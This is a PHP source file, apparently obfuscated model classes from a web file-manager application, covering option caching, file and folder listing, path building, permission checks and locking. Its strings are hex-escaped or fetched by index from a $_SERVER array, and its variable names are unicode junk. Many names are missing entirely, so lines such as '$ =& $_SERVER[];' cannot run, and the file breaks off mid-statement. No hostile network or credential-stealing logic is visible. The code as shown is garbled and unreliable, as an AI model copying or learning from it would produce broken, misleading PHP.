<?php
 goto dȴ; C⩑Ѯ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ӈ = false, $Ƥ = '', $۩ = false) { $ =& $_SERVER[]; $ = $this->cacheGet($Ƥ); $ = $this->optionDefault($Ƥ); $ = is_array($) ? $ : array(); if (is_array($)) { $ = array_merge($, $); return $ӈ ? isset($[$ӈ]) ? $[$ӈ] : null : $; } $ = $this->filterWhere(array($[33] => $Ƥ)); $ = $this->where($)->select(); $ = array_to_keyvalue($, $[94], $[418]); foreach ($ as $֔ => $) { if ($۩ || in_array($֔, $this->jsonField)) { $[$֔] = json_decode($, !0); } } $this->cacheSet($Ƥ, $); $ = array_merge($, $); return $ӈ ? $[$ӈ] : $; } public function set($ﻍ, $Υ = false, $ = '') { $ܠ =& $_SERVER[]; $this->cacheRemove($); $У = array(); $ = is_array($ﻍ) ? $ﻍ : array($ﻍ => $Υ); foreach ($ as $ => $٢У) { if (is_array($٢У)) { $٢У = json_encode_force($٢У); } $this->checkLength($٢У, !1, $this->tableName . $ܠ[4] . $ﻍ); $٢У = self::textEncode($٢У); $ = array($ܠ[33] => $, $ܠ[94] => $, $ܠ[418] => $٢У); $У[] = $this->filterWhere($); } if (!$У) { return !0; } $ǎ = $this->cacheKey($ܠ[444]); CacheLock::lock($ǎ); $虭 = $this->addAll($У, array(), !0); CacheLock::unlock($ǎ); return $虭; } protected function optionDefault($հՃ = '') { return !1; } public function setDeep($৾, $է = false, $Ã° = '') { $ӯ = explode($_SERVER[][10], $৾); $Ẉ = $this->get(); array_set_value($Ẉ, $৾, $է); $this->set($ӯ[0], $Ẉ[$ӯ[0]], $Ã°); } public function remove($ʮ̭, $ = '') { $ٙ =& $_SERVER[]; $this->cacheRemove($); $Ǫ = $this->filterWhere(array($ٙ[94] => $ʮ̭, $ٙ[33] => $)); if (is_null($ʮ̭)) { unset($Ǫ[$ٙ[94]]); } return $this->where($Ǫ)->delete(); } public function cacheSet($酝, $· = false) { return Cache::set($this->cacheKey($酝), $·); } public function cacheGet($ǝ) { return Cache::get($this->cacheKey($ǝ)); } public function cacheRemove($) { return Cache::remove($this->cacheKey($)); } protected function filterWhere($د) { return $د; } protected function cacheKey($Ѭ) { return $Ѭ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\x65"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\155\145" => "\151\x6f\x5f\163\x6f\x75\162\143\x65\137\155\x65\164\141", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\x73\x6f\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\124\x69\155\x65", "\164\x69\x6d\145", "\151\156\163\145\x72\164", "\146\165\156\x63\x74\x69\x6f\156"), array("\143\162\145\x61\x74\x65\124\151\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\164", "\x66\x75\156\x63\164\151\x6f\156"), array("\166\x69\x65\167\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($) { return $this->listSource(array($_SERVER[][445] => $)); } public function typeName($) { static $ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $[$ . $_SERVER[][12]]; } public function sourceListInfo($룯, $ʩ = false) { $ =& $_SERVER[]; $룯 = $룯 ? $룯 : array(); $룯 = array_filter(array_unique($룯)); if (!$룯) { return array(); } $ = $this->where(array($[181] => array($[7], $룯)))->select(); $this->_listDataApply($, $ʩ); return array_to_keyvalue($, $[181]); } public function pathInfoFilter(&$Ÿ) { $ =& $_SERVER[]; static $¹ = false; static $۶ = false; static $܃ = false; if (!$¹) { $ = $[446]; $ .= $[447]; $ .= $[448]; $뵃 = $[449]; $Ħ = explode($[50], $뵃); $¹ = explode($[50], $); $۶ = array(); foreach ($¹ as $ᦰ) { if (in_array($ᦰ, $Ħ)) { continue; } $۶[] = $ᦰ; } $܃ = explode($[50], $[450]); } foreach ($܃ as $) { if (isset($Ÿ[$])) { $Ÿ[$] = intval($Ÿ[$]); } } $Ÿ[$[84]] = $[451] . $Ÿ[$[181]] . $[452]; $Ÿ[$[33]] = $Ÿ[$[453]] == 1 ? $[75] : $[214]; $Ÿ[$[178]] = $this->typeName($Ÿ[$[178]]); if ($Ÿ[$[453]] != 1) { $Ÿ[$[175]] = $Ÿ[$[454]]; unset($Ÿ[$[454]]); } $Ԟ = $¹; if (isset($Ÿ[$[455]]) && $Ÿ[$[455]][$[456]] == -1) { $Ԟ = $۶; } $Ÿ = array_field_key($Ÿ, $Ԟ); return $Ÿ; } public function listUserFav() { $ =& $_SERVER[]; $Օå = Model($[457])->listData(); $ᐤ = array_filter_by_field($Օå, $[33], $[458]); $ᐤ = array_to_keyvalue($ᐤ, $[12], $[84]); if ($ᐤ) { $ = $this->listSource(array($[459] => array($[460], $ᐤ))); } $ = array_to_keyvalue($[$[413]], $[181]); foreach ($Օå as &$) { $ = array($[461] => $[$[443]], $[462] => $[$[32]], $[463] => $[$[84]], $[464] => $[$[33]], $[465] => $[$[215]], $[466] => $[$[85]]); if ($[$[33]] == $[458] && $[$[$[84]]]) { $[$[87]] = $[$[$[84]]]; } } unset($); return $Օå; } public function listUserTag($֯) { $ =& $_SERVER[]; if ($֯ && !is_array($֯)) { $֯ = array($֯); } $ = Model($[467])->listData(); $أ = array(); $ߜ = array(); foreach ($ as $Է) { $ = $Է[$[84]]; if (!$) { continue; } if (!isset($ߜ[$])) { $ߜ[$] = array(); } $ߜ[$][] = $Է[$[468]]; $أ[$Է[$[84]]] = $Է; } $ = array(); $𠷷 = array(); $ֻ۸ = array(); foreach ($ߜ as $܅ => $Ԑ) { $Տ = !0; if (!$֯) { $[] = $܅; continue; } foreach ($֯ as $) { if (!in_array($, $Ԑ)) { $Տ = !1; break; } } if (!$Տ) { continue; } if (!is_numeric($܅)) { $൥ = $أ[$܅]; $ = array($[32] => $൥[$[32]], $[84] => $൥[$[84]], $[33] => $൥[$[33]], $[87] => array($[469] => 1), $[216] => !0); if ($൥[$[33]] == $[214]) { $ֻ۸[] = $; } if ($൥[$[33]] == $[75]) { $𠷷[] = $; } continue; } $[] = $܅; } if ($) { $܎ = $this->listSource(array($[459] => array($[460], $))); } $܎ = $܎ ? $܎ : array($[82] => array(), $[83] => array()); $܎[$[82]] = array_merge($܎[$[82]], $𠷷); $܎[$[83]] = array_merge($܎[$[83]], $ֻ۸); if (isset($܎[$[410]]) && count($) == $܎[$[410]][$[411]]) { return $܎; } $؊ = array(); $֦ = array_to_keyvalue($܎[$[82]], $[12], $[181]); $؏ = array_to_keyvalue($܎[$[83]], $[12], $[181]); $ガ = array_merge($؏, $֦); foreach ($ as $) { if (!in_array($, $ガ)) { $؊[] = $; } } if ($؊) { Model($[470])->removeBySource($؊); } return $܎; } public function listUserRecycle() { $٤ =& $_SERVER[]; $ = Model($٤[471])->listData(); if (!$) { return array(); } $ = array($٤[459] => array($٤[460], $), $٤[472] => 1); return $this->listSource($); } public function listSource($, $ = 3000, $ = false) { $©޹ =& $_SERVER[]; if (!isset($[$©޹[473]])) { $[$©޹[473]] = 0; } if (isset($[$©޹[180]]) && $[$©޹[180]] == $©޹[212]) { $[$©޹[454]] = array($©޹[375], $©޹[474]); } $ = $©޹[475]; $̩ = $this->field($)->_makeOrder()->where($)->selectPage($); $this->_listPageCheck($̩, $, $); $this->_listDataApply($̩[$©޹[413]], $); $this->_listMake($̩); return $̩; } private function _listPageCheck(&$΁, $, $) { $ =& $_SERVER[]; if (!is_array($΁[$[410]])) { return; } $̬ = $΁[$[410]]; if ($̬[$[412]] <= 1) { return; } if ($̬[$[411]] >= 100000) { return; } if (Model($[476])->get($[477]) != $[478]) { return; } $ = str_replace(array($[53], $[386], $[246]), $[12], $); $ = $[479] . str_replace($[50], $[480], $) . $[481]; $Ǘ = $[482]; $Ǘ = $Ǘ . $[483]; $ΰ = $̬[$[407]] * ($̬[$[397]] - 1) . $[50] . $̬[$[407]]; $ = $this->_makeOrder(!0); $̏Ӭ = $[479] . str_replace($[50], $[480], $[0]); if (strpos($̏Ӭ, $[484])) { $̏Ӭ = str_replace($[484], $[485], $̏Ӭ); } else { $̏Ӭ .= $[486] . $[1]; } $ = array(); foreach ($ as $ => $ؾ怍) { $[$[479] . $] = $ؾ怍; } $this->alias($[487])->field($)->limit($ΰ)->order($̏Ӭ); $휶 = $this->join($Ǘ)->where($)->select(); if ($휶) { $΁[$[413]] = $휶; } } protected function _makeOrder($ӈԤ = false) { $禊 =& $_SERVER[]; $ = Model($禊[488])->get($禊[489]); $ᤒ = Model($禊[488])->get($禊[490]); $݉ = array($禊[491] => $禊[492], $禊[493] => $禊[494]); $Ѫ = array($禊[32] => $禊[32], $禊[76] => $禊[76], $禊[175] => $禊[454], $禊[495] => $禊[495], $禊[496] => $禊[497], $禊[215] => $禊[215], $禊[85] => $禊[85]); $۞Ǣ = Input::get($禊[498], $禊[7], $, array_keys($Ѫ)); $Ἦ = Input::get($禊[499], $禊[7], $ᤒ, array_keys($݉)); if (!in_array($۞Ǣ, array_keys($Ѫ))) { $۞Ǣ = $禊[32]; } if (!in_array($Ἦ, array_keys($݉))) { $۞Ǣ = $禊[491]; } if ($۞Ǣ == $禊[32]) { } $ä = $禊[500] . $Ѫ[$۞Ǣ] . $禊[53] . $݉[$Ἦ]; $ä = rtrim(trim($ä), $禊[50]); if ($ӈԤ) { return array($ä, $݉[$Ἦ]); } return $this->order($ä); } protected function _listDataApplyItem($׬Ԩ, $ = false) { $ = array($׬Ԩ); $this->_listDataApply($, $); return $[0]; } protected function _listDataApply(&$ٓ, $ìё = false) { $ᝯ =& $_SERVER[]; if (!$ٓ) { $ٓ = array(); return; } $ɻ΂ = array_to_keyvalue($ٓ, $ᝯ[12], $ᝯ[181]); $ɻ΂ = array_unique($ɻ΂); $this->_listSourceCache($ٓ); if (!$ìё) { $this->_listAppendMeta($ٓ, $ɻ΂); $this->_listAppendFileMeta($ٓ, $ɻ΂); $this->_listAppendChildren($ٓ, $ɻ΂); } $this->_listAppendPath($ٓ); $this->_listAppendAuth($ٓ); $this->_listAppendSourceInfo($ٓ, $ɻ΂); $this->_listAppendUser($ٓ); $this->_listFilterInfo($ٓ, $ìё); $this->_listAppendAuthSecret($ٓ); } protected function _listSourceCache($Ӿ) { $ =& $_SERVER[]; foreach ($Ӿ as $) { self::$cacheSourceInfo[$[501] . $[$[181]]] = $; } } protected function _listFilterInfo(&$, $ = false) { $ =& $_SERVER[]; foreach ($ as &$Ǘׁ) { $Ǘׁ = $this->pathInfoFilter($Ǘׁ); self::$cachePathInfo[$[502] . intval($) . $[430] . $Ǘׁ[$[181]]] = $Ǘׁ; } unset($Ǘׁ); } protected function _listMake(&$) { $ =& $_SERVER[]; $[$[82]] = array(); $[$[83]] = array(); foreach ($[$[413]] as $) { $䉓 = $[$[453]] == 1 ? $[82] : $[83]; $[$䉓][] = $; } unset($[$[413]]); } protected function _listAppendMeta(&$, $ݬ٧) { $ =& $_SERVER[]; $ލ = array($[459] => array($[460], $ݬ٧)); $л = Model($[503])->field($[504])->where($ލ)->select(); if (!$л) { return; } $ǒ̇ = array($[505], $[506], $[485]); $ = array(); foreach ($л as $) { if (!isset($[$[$[181]]])) { $[$[$[181]]] = array(); } if (in_array($[$[94]], $ǒ̇)) { continue; } $[$[$[181]]][$[$[94]]] = $[$[418]]; } foreach ($ as &$) { $[$[507]] = !1; if (isset($[$[$[181]]])) { $[$[507]] = $[$[$[181]]]; } if ($this->fileIsLock($) && $[$[455]]) { $ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $[$[455]][$[456]] = AuthModel::authDisable($[$[455]][$[456]], $); $[$[455]][$[508]][$[455]] = $[$[455]][$[456]]; } } unset($); } protected function _listAppendFileMeta(&$ȁ, $) { $ =& $_SERVER[]; $ = array_to_keyvalue($ȁ, $[12], $[509]); $ = array_filter(array_unique($)); if (!$) { return; } $ = array($[510] => array($[460], $)); $ƪ = $[511]; $ = Model($[512])->field($ƪ)->where($)->select(); $ = array_to_keyvalue($, $[509]); $є = Model($[513])->field($[514])->where($)->select(); $є = $є ? $є : array(); $Ē֝ = array(); foreach ($є as $܊Ȯ) { if (!isset($Ē֝[$܊Ȯ[$[509]]])) { $Ē֝[$܊Ȯ[$[509]]] = array(); } $Ē֝[$܊Ȯ[$[509]]][$܊Ȯ[$[94]]] = $܊Ȯ[$[418]]; } foreach ($ȁ as &$Ĺ) { $Ϊ = $Ĺ[$[509]]; if (!$Ϊ || !is_array($[$Ϊ])) { continue; } $潡 = $[$Ϊ]; $潡[$[76]] = $Ĺ[$[76]]; $潡[$[32]] = $Ĺ[$[32]]; if (!isset(self::$cacheFileInfo[$[515] . $Ϊ])) { self::$cacheFileInfo[$[515] . $Ϊ] = array_merge(array(), $潡); } unset($[$Ϊ][$[84]]); $֔ = is_array($Ē֝[$Ϊ]) ? $Ē֝[$Ϊ] : array(); $Ĺ[$[516]] = array_merge($֔, $[$Ϊ]); if (isset($Ĺ[$[516]][$[171]])) { $Ĺ[$[171]] = json_decode($Ĺ[$[516]][$[171]], !0); unset($Ĺ[$[516]][$[171]]); } } unset($Ĺ); } protected function _listAppendSourceInfo(&$ݕ, $ۋ) { $ =& $_SERVER[]; $܁ = Model($[517])->listData(); $ = Model($[467])->listData(); $څע = Model($[457])->listData(); $κ = Model($[518])->listSimple(); $ŉ = array_to_keyvalue($܁, $[443]); $˂ = array_to_keyvalue_group($, $[84], $[468]); $޵ = array_to_keyvalue($څע, $[84]); $ջ = array_to_keyvalue_group($κ, $[181]); foreach ($ݕ as &$ʜ) { $ʜ[$[87]] = array($[519] => 0, $[520] => 0, $[521] => 0); if (isset($޵[$ʜ[$[181]]])) { $ʜ[$[87]][$[522]] = 1; $ʜ[$[87]][$[523]] = $޵[$ʜ[$[181]]][$[32]]; } if ($˂ && $ŉ && isset($˂[$ʜ[$[181]]])) { $ʜ[$[87]][$[524]] = array(); foreach ($˂[$ʜ[$[181]]] as $ܪ΋) { $ = $ŉ[$ܪ΋]; $ʜ[$[87]][$[524]][] = array($[525] => $[$[443]], $[462] => $[$[32]], $[526] => $[$[527]]); } } if ($ջ && isset($ջ[$ʜ[$[181]]])) { $ʜ[$[87]][$[528]] = array(); foreach ($ջ[$ʜ[$[181]]] as $) { $ە = $[529]; if ($[$[530]] == $[88]) { $ە .= $[531]; } $ʜ[$[87]][$[528]] = array_field_key($, explode($[50], $ە)); } } } unset($ʜ); return $ݕ; } protected function _listAppendChildren(&$, $ȁ) { $ =& $_SERVER[]; $ĳ = array(); $ = array($[223] => 0, $[224] => 0); foreach ($ as &$ʬ) { if (!$ʬ[$[453]]) { continue; } $ĳ[] = $ʬ[$[181]]; } unset($ʬ); if (!$ĳ) { return; } $ = array($[180] => array($[7], $ĳ), $[473] => 0); $ϳ = array($[180], $[453], $[532] => $[533]); $ʓ = $this->field($ϳ)->where($)->group($[534])->select(); $ո = array(); foreach ($ʓ as $䇰) { $׶ = $䇰[$[180]]; $ = $䇰[$[453]] == $[88] ? $[224] : $[223]; if (!isset($ո[$׶])) { $ո[$׶] = array($[223] => 0, $[224] => 0); } $ո[$׶][$] += $䇰[$[533]]; } foreach ($ as &$ʬ) { if (!$ʬ[$[453]]) { continue; } $ì = is_array($ո[$ʬ[$[181]]]) ? $ո[$ʬ[$[181]]] : $; $ʬ[$[224]] = $ì[$[224]]; $ʬ[$[223]] = $ì[$[223]]; unset($ʬ[$[454]]); } unset($ʬ); } protected function _listAppendAuth(&$) { $ =& $_SERVER[]; $ʪҌ = array(); foreach ($ as $Ӵ) { if ($Ӵ[$[178]] == self::TYPE_GROUP) { $ʪҌ[] = $Ӵ[$[181]]; } } if (!$ʪҌ) { return; } $˻ = array_to_keyvalue($, $[181]); $Я = Model($[535])->getSourceList($ʪҌ, $˻); $钩 = $GLOBALS[$[536]] == 1; foreach ($ as $ => &$Ӵ) { $Ӵ[$[455]] = $Я[$Ӵ[$[181]]]; if (!$Ӵ[$[455]] && $Ӵ[$[178]] == self::TYPE_GROUP) { $Ӵ[$[455]] = Action($[537])->pathGroupAuthMake($Ӵ[$[538]]); if (!$Ӵ[$[455]] && !$钩) { $Ӵ[$[217]] = !1; $Ӵ[$[216]] = !1; } } if ($Ӵ[$[455]]) { $Ӵ[$[217]] = AuthModel::authCheckEdit($Ӵ[$[455]][$[456]]); $Ӵ[$[216]] = AuthModel::authCheckView($Ӵ[$[455]][$[456]]); } $this->groupPathDisplay($Ӵ); } unset($Ӵ); } public function _listAppendAuthSecret(&$ϫԑ) { $ꐊ =& $_SERVER[]; if (Model($ꐊ[476])->get($ꐊ[539]) != $ꐊ[88]) { return; } static $٪ = false; if (!$٪) { $ߗ = Model($ꐊ[540]); $ = Model($ꐊ[541]); $٪ = $->listData(); $٪ = array_to_keyvalue($٪, $ꐊ[181]); $ = json_decode(Model($ꐊ[476])->get($ꐊ[542]), !0); $ = array_to_keyvalue($, $ꐊ[443]); foreach ($٪ as $Ć => $Ϩ) { $ = $[$Ϩ[$ꐊ[543]]]; if (!$) { $->remove($Ϩ[$ꐊ[443]]); unset($٪[$Ć]); continue; } $ơ = $ߗ->listData($[$ꐊ[455]]); if (!$ơ) { $->remove($Ϩ[$ꐊ[443]]); unset($٪[$Ć]); continue; } $Ϩ[$ꐊ[455]] = $ơ; $Ϩ[$ꐊ[544]] = $; $Ϩ[$ꐊ[545]] = Model($ꐊ[546])->getInfoSimpleOuter($Ϩ[$ꐊ[495]]); $٪[$Ć] = $Ϩ; } } $¾ = USER_ID; $Ђᣆ = array(); $޹ = $this->_listAppendPath($Ђᣆ, !0); foreach ($ϫԑ as $Ć => &$Ϩ) { if (!is_array($Ϩ[$ꐊ[455]])) { continue; } if ($Ϩ[$ꐊ[178]] != $ꐊ[547]) { continue; } if (isset($٪[$Ϩ[$ꐊ[181]]])) { $ߡ = $٪[$Ϩ[$ꐊ[181]]]; if (!is_array($Ϩ[$ꐊ[507]])) { $Ϩ[$ꐊ[507]] = array(); } $Ϩ[$ꐊ[507]][$ꐊ[548]] = $ߡ[$ꐊ[543]]; $Ϩ[$ꐊ[455]][$ꐊ[549]] = $ߡ; $Ϩ[$ꐊ[455]][$ꐊ[550]] = $Ϩ[$ꐊ[551]]; $Ϩ[$ꐊ[455]][$ꐊ[552]] = $ꐊ[88]; if ($ߡ[$ꐊ[495]] != $¾) { $Ϩ[$ꐊ[455]][$ꐊ[456]] = $Ϩ[$ꐊ[455]][$ꐊ[456]] & $ߡ[$ꐊ[455]][$ꐊ[455]]; } continue; } $Ţ = $this->parentLevelArray($Ϩ[$ꐊ[553]]); $ = array_reverse($Ţ); foreach ($ as $ڞ => $) { if (!isset($٪[$])) { continue; } $ߡ = $٪[$]; $Ϩ[$ꐊ[455]][$ꐊ[549]] = $ߡ; if ($ߡ[$ꐊ[495]] != $¾) { $Ϩ[$ꐊ[455]][$ꐊ[456]] = $Ϩ[$ꐊ[455]][$ꐊ[456]] & $ߡ[$ꐊ[455]][$ꐊ[455]]; } $ⰷ = $ꐊ[12]; $҃ʃ = count($Ţ) - $ڞ; for ($͞ = 0; $͞ < $҃ʃ; $͞++) { if (!isset($޹[$Ţ[$͞]])) { $ⰷ = $ꐊ[12]; break; } $ⰷ = $ⰷ . rtrim($޹[$Ţ[$͞]], $ꐊ[8]) . $ꐊ[8]; } $Ϩ[$ꐊ[455]][$ꐊ[550]] = rtrim($ⰷ, $ꐊ[8]) . $ꐊ[8]; break; } } unset($Ϩ); } public function groupPathDisplay(&$Ѿ) { $ϳ =& $_SERVER[]; if ($Ѿ[$ϳ[178]] != self::TYPE_GROUP) { return; } $󪾇 = Model($ϳ[554])->getInfo($Ѿ[$ϳ[538]]); $ݬ = $this->parentLevelArray($󪾇[$ϳ[553]]); $ = $ϳ[12]; foreach ($ݬ as $) { $ = Model($ϳ[554])->getInfo($); $ .= $[$ϳ[87]][$ϳ[181]] . $ϳ[50]; } $Ѿ[$ϳ[555]] = $󪾇[$ϳ[180]]; $Ѿ[$ϳ[556]] = $󪾇[$ϳ[553]]; $Ѿ[$ϳ[557]] = $󪾇[$ϳ[558]]; $Ѿ[$ϳ[559]] = $ . $󪾇[$ϳ[87]][$ϳ[181]]; } protected function _listAppendPath(&$Ū֧, $Ґ˫ = false) { $¦ =& $_SERVER[]; static $ = array(); $ = array(); $ = array(); if ($Ґ˫) { return $; } foreach ($Ū֧ as &$) { $ = $[$¦[181]]; if ($[$¦[453]] == $¦[88] && $[$¦[180]] != 0) { $[$] = $[$¦[32]]; } if ($[$¦[453]] == $¦[88] && $[$¦[180]] == 0) { $[$] = $this->_listAppendPathRoot($, array()); } if (isset($[$[$¦[553]]])) { continue; } $[$[$¦[553]]] = !0; $ = $this->parentLevelArray($[$¦[553]]); foreach ($ as $ => $頾) { if (isset($[$頾])) { continue; } if ($ == 0) { $[$頾] = $this->_listAppendPathRoot($, $); } if ($ != 0) { $[] = $頾; } } } unset($); $ = array_unique($); if (count($) > 0) { $ = array($¦[459] => array($¦[460], $)); if (count($) == 1) { $ؽ䑾 = $this->sourceInfo($[0]); $ = is_array($ؽ䑾) ? array($ؽ䑾) : !1; } else { $ = $this->field($¦[560])->where($)->select(); } if (!$) { $ = array(); } foreach ($ as $) { $[$[$¦[181]]] = $[$¦[32]]; } } $̘҅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $݂ = array(); foreach ($Ū֧ as &$) { $̢ = $[$¦[553]]; $蟹 = $¦[12]; if (isset($݂[$̢])) { $蟹 = $݂[$̢]; } else { $ = $this->parentLevelArray($[$¦[553]]); foreach ($ as $ => $頾) { if (isset($[$頾])) { $蟹 .= $[$頾] . $¦[8]; } } $݂[$̢] = $蟹; } $蟹 .= $[$¦[32]]; if ($[$¦[453]] == $¦[88]) { $蟹 .= $¦[8]; } $[$¦[551]] = str_replace($¦[561], $¦[8], $蟹); if ($[$¦[180]] == $¦[212]) { $[$¦[32]] = trim($[$[$¦[181]]], $¦[8]); $[$¦[551]] = $[$¦[32]] . $¦[8]; } if (intval($[$¦[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($, $, $̘҅); } } unset($); return $Ū֧; } private function _listAppendPathRecycle(&$Σ, $, $ɥ) { $ =& $_SERVER[]; if (!in_array($ɥ, $) && $Σ[$[181]] != $ɥ) { return; } $ = explode($[8], trim($Σ[$[551]], $[8])); $ = implode($[8], array_slice($, 2)); $Σ[$[551]] = $[8] . LNG($[562]) . $[8] . ltrim($, $[8]); $Σ[$[553]] = $[563] . implode($[50], array_slice($, 1)) . $[50]; if ($Σ[$[181]] == $ɥ) { $Σ[$[553]] = $[563]; $Σ[$[180]] = $[212]; $Σ[$[32]] = LNG($[562]); } $Σ[$[564]] = $[565]; } protected function _listAppendPathRoot(&$, $) { $ =& $_SERVER[]; static $ = false; $Ôܳ = $[12]; if ($[$[178]] == self::TYPE_USER) { if ($[$[538]] == USER_ID) { $Ôܳ = LNG($[566]); if ($ === !1) { $ = Model($[567])->getInfoFull(USER_ID); $ = _get($, $[568], $[12]); } if ($ && $[0] == $ || !$ && $[$[181]] == $) { $Ôܳ = LNG($[569]); $[$[570]] = $[571]; } if (!$) { $[$[32]] = $Ôܳ; } } else { $[$[572]] = Model($[546])->getInfoSimpleOuter($[$[538]]); $Ôܳ = LNG($[573]) . $[163] . $[$[572]][$[32]] . $[165]; } } else { if ($[$[178]] == self::TYPE_GROUP) { $ɻ = Model($[554])->getInfoSimple($[$[538]]); $Ôܳ = $ɻ[$[32]]; } else { if ($[$[178]] == self::TYPE_SYSTEM) { $Ôܳ = $[574]; } } } $Ôܳ = $Ôܳ ? $[8] . $Ôܳ . $[8] : $[8]; return $Ôܳ; } protected function _listAppendUser(&$Ң՞) { $課 =& $_SERVER[]; $ڲ = array_to_keyvalue($Ң՞, $課[12], $課[495]); $ד = array_to_keyvalue($Ң՞, $課[12], $課[497]); $ܾ = array_merge($ڲ, $ד); $ = Model($課[567])->userListInfo($ܾ); foreach ($Ң՞ as &$ٸ) { $ڶӬ = $ٸ[$課[495]]; $ٸ[$課[495]] = $[$ڶӬ] ? $[$ڶӬ] : !1; $ڶӬ = $ٸ[$課[497]]; $ٸ[$課[497]] = $[$ڶӬ] ? $[$ڶӬ] : !1; if (isset($ٸ[$課[507]]) && $ٸ[$課[507]][$課[575]]) { $ق = $GLOBALS[$課[6]][$課[89]][$課[576]]; if ($ٸ[$課[507]][$課[577]] <= time() - $ق) { $this->metaSet($ٸ[$課[181]], $課[575], null); $this->metaSet($ٸ[$課[181]], $課[577], null); unset($ٸ[$課[507]][$課[575]]); continue; } $ = $ٸ[$課[507]][$課[575]]; $ٸ[$課[507]][$課[578]] = Model($課[567])->getInfoSimpleOuter($); } } unset($ٸ); } public function parentLevelArray($ߦ) { $ȇ =& $_SERVER[]; $ߦ = explode($ȇ[50], trim($ߦ, $ȇ[50])); return array_remove_value($ߦ, $ȇ[212]); } public function listAll($К) { $߶ =& $_SERVER[]; $ = $this->sourceInfo($К); $ׂ = array($߶[579] => array($߶[580], $[$߶[553]] . $К . $߶[581]), $߶[582] => 0); $Ǣ = $߶[583]; $ = "\114\x45\106\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\x66\x69\x6c\145\x20\146\x69\x6c\x65\x20\x6f\156\40\x73\x6f\x75\x72\143\x65\x2e\146\151\x6c\x65\111\x44\40\x3d\40\146\151\x6c\145\x2e\146\151\154\x65\111\104"; $ = $this->alias($߶[487])->field($Ǣ)->where($ׂ)->join($)->select(); $this->_listAppendAuth($); $this->_listAppendUser($); $this->_listAppendPath($); $ = array_to_keyvalue($, $߶[181]); $Ď = "\57{$[$߶[32]]}\x2f"; $Ď = $Ď == $߶[561] ? $߶[8] : $Ď; $ߘ = array(); foreach ($ as $ߪ => $Ġ) { $ = $this->parentLevelArray($Ġ[$߶[553]]); array_shift($); $Ŷ = $Ď; for ($釔 = 0; $釔 < count($); $釔++) { $Ŷ .= $[$[$釔]][$߶[32]] . $߶[8]; } $Ŷ .= $Ġ[$߶[32]]; if ($Ġ[$߶[453]]) { $Ŷ .= $߶[8]; } $݊ = array($߶[463] => str_replace($߶[561], $߶[8], str_replace($߶[561], $߶[8], str_replace($߶[561], $߶[8], $Ŷ))), $߶[584] => intval($Ġ[$߶[453]]), $߶[585] => intval($Ġ[$߶[76]]), $߶[85] => intval($Ġ[$߶[85]]), $߶[87] => $this->pathInfoFilter($Ġ)); if (!$݊[$߶[453]]) { $݊[$߶[509]] = $Ġ[$߶[509]]; } $ߘ[] = $݊; } $ߘ = array_sort_by($ߘ, $߶[84]); return $ߘ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($) { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($[586], $); $ = 1; $this->_lockEvent($, array($[587], $[588]), $); $this->_lockParent($, array($[588]), $); $this->_lockEvent($, array($[589], $[590]), $); $this->_lockCheckEnd($[586], $); } public function lockCopyEnd($˼) { $ɧ =& $_SERVER[]; if (!$this->allowLock()) { return; } $󌓙 = 0; $this->_lockEvent($˼, array($ɧ[587], $ɧ[588]), $󌓙); $this->_lockParent($˼, array($ɧ[588]), $󌓙); $this->_lockEvent($˼, array($ɧ[589], $ɧ[590]), $󌓙); } public function lockWriteStart($, $ = '') { $ն =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($ն[587], $); $ = 1; $this->_lockKey($ն[591] . $ . $ն[10] . $, $); $this->_lockEvent($, array($ն[586], $ն[588]), $); $this->_lockParent($, array($ն[586], $ն[588]), $); $this->_lockCheckEnd($ն[587], $); } public function lockWriteEnd($, $¨ڑ = '') { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $ = 0; $this->_lockKey($[591] . $ . $[10] . $¨ڑ, $); $this->_lockEvent($, array($[586], $[588]), $); $this->_lockParent($, array($[586], $[588]), $); } public function lockMoveStart($) { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($[588], $); $樃 = 1; $this->_lockKey($[592] . $, $樃); $this->_lockEvent($, array($[586], $[587]), $樃); $this->_lockParent($, array($[586], $[588]), $樃); $this->_lockEvent($, array($[593], $[589], $[590]), $樃); $this->_lockCheckEnd($[588], $); } public function lockMoveEnd($Ƌҿ) { $Ԝ =& $_SERVER[]; if (!$this->allowLock()) { return; } $÷ = 0; $this->_lockKey($Ԝ[592] . $Ƌҿ, $÷); $this->_lockEvent($Ƌҿ, array($Ԝ[586], $Ԝ[587]), $÷); $this->_lockParent($Ƌҿ, array($Ԝ[586], $Ԝ[588]), $÷); $this->_lockEvent($Ƌҿ, array($Ԝ[593], $Ԝ[589], $Ԝ[590]), $÷); } private function _lockCheck($܉м, $ҩ䷘) { $оּ =& $_SERVER[]; $Û = $this->sourceInfo($ҩ䷘); $ = $܉м . $оּ[10] . $ҩ䷘; $this->_lockTimeStart[$] = timeFloat(); if (!is_array($Û)) { return; } $ɣ = LNG($оּ[594]); CacheLock::setErrorMsg($оּ[163] . htmlspecialchars($Û[$оּ[32]]) . $оּ[165] . $ɣ); $this->_lockKey($, 1); $this->_lockKey($, 0); $ = array_reverse($this->parentLevelArray($Û[$оּ[553]])); foreach ($ as $݂) { $ = $܉м . $оּ[595] . $݂; if 